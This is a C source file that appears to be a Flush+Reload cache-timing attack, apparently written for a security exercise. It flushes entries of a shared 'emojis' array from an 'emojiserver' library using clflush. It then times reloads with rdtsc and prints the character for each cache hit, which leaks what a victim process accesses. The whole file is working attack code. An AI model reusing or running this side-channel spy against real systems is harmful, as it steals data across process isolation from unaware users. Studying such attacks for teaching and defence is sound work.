#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <wchar.h>
#include "emojiserver.h"


#define PORT 8080 
#define SIZE_ORDER 81
#define THRESHOLD 120

unsigned char order[81]={26, 24, 17,  68, 41, 55, 57, 56, 54, 9, 53, 18,39, 71, 4, 63, 14, 30, 27, 12, 75, 33, 20, 38, 45, 40, 21, 69, 16, 2, 23, 13, 49, 8,19, 78, 76, 62, 3, 77, 67, 31, 50, 66,70, 47, 28, 15, 29, 36, 44, 79, 25, 60, 58, 22, 0, 32,1, 10, 73, 52, 11, 6, 80, 65, 42, 61, 74, 37, 46, 51, 35, 48, 5, 64, 59, 72, 34, 7, 43};

unsigned long probe(char *adrs) ;

wchar_t *emojis;

void flush(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" clflush 0(%0) \n"
	" mfence \n"
	" lfence \n"

 : 
 : "c" (adrs)
 : );
}

unsigned long probe(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" mfence \n"
	" lfence \n"
	" rdtsc \n"
	" lfence \n"
	" movl %%eax, %%esi \n"
	" movl (%1), %%eax \n"
	" lfence \n"
	" rdtsc \n"
	" subl %%esi, %%eax \n"
	" clflush 0(%1) \n"

 : "=a" (time)
 : "c" (adrs)
 : "%esi", "%edx");
 return time;
}



int CheckGlobal(){
	
  unsigned char i;
  unsigned long t;

  for(i=0;i<81;i++){
	if (order[i]==0 || order[i]=='m'-'-'){
		continue;
	}
	t=probe((char *)&emojis[order[i]*160]);
	if (t<120){
		  //printf("%i:%c %u\n",order[i],order[i],t);
		  printf("%c",order[i]+'-');

	}
  }

}

void flushAll(){
	for(unsigned  i=0;i<(SIZE_ORDER);i++){
		flush((char *)&emojis[i*160]);
	}
}
int main(){
	emojis=getEmojis();
	setvbuf(stdout, NULL, _IONBF, 0);
	
	printf("Using Threshold = %u\n",THRESHOLD);
	printf("emojis at %p\n",emojis);
	flushAll();
	while (1){
		CheckGlobal();
	}
	


  return 0;
}
